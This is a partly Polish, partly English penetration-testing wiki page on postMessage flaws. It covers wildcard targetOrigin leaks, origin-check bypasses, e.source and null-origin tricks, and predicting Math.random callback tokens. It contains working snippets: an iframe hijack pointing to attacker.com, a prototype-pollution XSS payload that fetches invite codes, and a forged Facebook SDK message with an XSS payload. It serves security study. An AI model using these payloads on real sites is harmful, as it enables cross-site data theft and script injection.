# Luki w PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Wysyłanie **PostMessage**

**PostMessage** używa następującej funkcji do wysyłania wiadomości:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Zauważ, że **targetOrigin** może być '\*' lub URL, na przykład _https://company.com._\
W **drugim scenariuszu**, **wiadomość może zostać wysłana tylko do tej domeny** (nawet jeśli origin obiektu Window jest inny).\ 
Jeśli użyty jest **wildcard**, **wiadomości mogą zostać wysłane do dowolnej domeny**, i zostaną przesłane do origin obiektu Window.

### Atak na iframe & wildcard w **targetOrigin**

Jak wyjaśniono w [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) jeśli znajdziesz stronę, którą można **iframed** (brak ochrony `X-Frame-Header`) i która **wysyła wrażliwe** wiadomości przez **postMessage** używając **wildcard** (\*), możesz **zmodyfikować** **origin** **iframe** i **leak** **wrażliwą** wiadomość do domeny kontrolowanej przez Ciebie.\ 
Zwróć uwagę, że jeśli stronę można **iframed**, ale **targetOrigin** jest **ustawiony na URL, a nie na wildcard**, ta **sztuczka nie zadziała**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener eksploatacja

**`addEventListener`** to funkcja używana przez JS do zadeklarowania funkcji, która oczekuje `postMessages`.\  
Zostanie użyty kod podobny do następującego:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeracja

In order to **find event listeners** in the current page you can:

- **Przeszukaj** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Wykonaj** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Przejdź do** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Użyj **rozszerzenia przeglądarki** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). These browser extensions will **intercept all the messages** and show them to you.

### Ominięcia sprawdzania origin

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### Ominięcie e.origin == window.origin

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Ominięcie e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Możesz wymusić, aby **`e.source`** wiadomości było null, tworząc **iframe**, który **wysyła** **postMessage** i jest **natychmiast usuwany**.

Dla więcej informacji **przeczytaj:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Aby wykonać te ataki najlepiej będzie, jeśli będziesz mógł **umieścić stronę ofiary** wewnątrz `iframe`. Ale niektóre nagłówki, takie jak `X-Frame-Header`, mogą **uniemożliwić** to **zachowanie**.\
W takich scenariuszach możesz nadal użyć mniej ukrytego ataku. Możesz otworzyć nową kartę z podatną aplikacją webową i komunikować się z nią:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stealing message sent to child by blocking the main page

Na poniższej stronie możesz zobaczyć, jak można ukraść **sensitive postmessage data** wysłane do **child iframe** poprzez **blocking** **main** page przed wysłaniem danych i wykorzystać **XSS in the child**, aby **leak the data** zanim zostaną odebrane:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Stealing message by modifying iframe location

Jeśli możesz osadzić stronę w iframe bez X-Frame-Header, która zawiera kolejny iframe, możesz **change the location of that child iframe**, więc jeśli odbiera ona **postmessage** wysłany z użyciem **wildcard**, atakujący mógłby **change** ten iframe **origin** na stronę **controlled** przez niego i **steal** wiadomość:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

W scenariuszach, gdzie dane wysłane przez `postMessage` są wykonywane przez JS, możesz iframe'ować stronę i **exploit** **prototype pollution/XSS**, wysyłając exploit przez `postMessage`.

Kilka bardzo dobrze wyjaśnionych przypadków **XSS through `postMessage`** można znaleźć pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Przykład exploita do wykorzystania **Prototype Pollution and then XSS** przez `postMessage` do `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Aby uzyskać **więcej informacji**:

- Link do strony o [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link do strony o [**XSS**](../xss-cross-site-scripting/index.html)
- Link do strony o [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Przewidywanie **`Math.random()`** tokenów callback w mostach postMessage

Gdy walidacja wiadomości używa „shared secret” wygenerowanego przez `Math.random()` (np. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) i ten sam helper nadaje nazwy plugin iframes, możesz odzyskać wartości PRNG i sfałszować zaufane wiadomości:

- **Leak PRNG outputs via `window.name`:** SDK automatycznie nadaje nazwy plugin iframes przy pomocy `guid()`. Jeśli kontrolujesz top frame, osadź stronę ofiary w iframe, następnie przekieruj plugin iframe na swój origin (np. `window.frames[0].frames[0].location='https://attacker.com'`) i odczytaj `window.frames[0].frames[0].name`, aby uzyskać surowe wyjście `Math.random()`.
- **Force more outputs without reloads:** Niektóre SDK udostępniają ścieżkę reinit; w FB SDK wywołanie `init:post` z `{xfbml:1}` wymusza `XFBML.parse()`, niszczy/odtwarza plugin iframe i generuje nowe nazwy/ID callbacków. Powtarzane reinit generuje tyle wyjść PRNG, ile potrzeba (uwaga na dodatkowe wewnętrzne wywołania `Math.random()` dla callback/iframe ID, więc solvery muszą pominąć wartości pośrednie).
- **Trusted-origin delivery via parameter pollution:** Jeśli endpoint pluginu first-party odzwierciedla niesanitizowany parametr w cross-window payload (np. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), możesz wstrzyknąć `&type=...&iconSVG=...` zachowując zaufany origin `facebook.com`.
- **Predict the next callback:** Konwertuj leaked nazwy iframe z powrotem na floaty w `[0,1)` i podaj kilka wartości (nawet niekolejne) do predyktora `Math.random` V8 (np. oparty na Z3). Wygeneruj następne `guid()` lokalnie, aby sfałszować oczekiwany token callback.
- **Trigger the sink:** Przygotuj dane postMessage tak, aby bridge wywołał `xd.mpn.setupIconIframe` i wstrzyknął HTML do `iconSVG` (np. URL-encoded `<img src=x onerror=...>`), uzyskując DOM XSS wewnątrz hostującego originu; stamtąd można odczytać iframe'y o tym samym originie (dialogi OAuth, arbiters itp.).
- **Framing quirks help:** Łańcuch wymaga framingu. W niektórych mobile webview `X-Frame-Options` może degradować do nieobsługiwanego `ALLOW-FROM` gdy obecny jest `frame-ancestors`, a parametry „compat” mogą wymusić permisywne `frame-ancestors`, umożliwiając kanał boczny `window.name`.

#### Minimalny przykład sfałszowanej wiadomości
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Źródła

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Do ćwiczeń: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
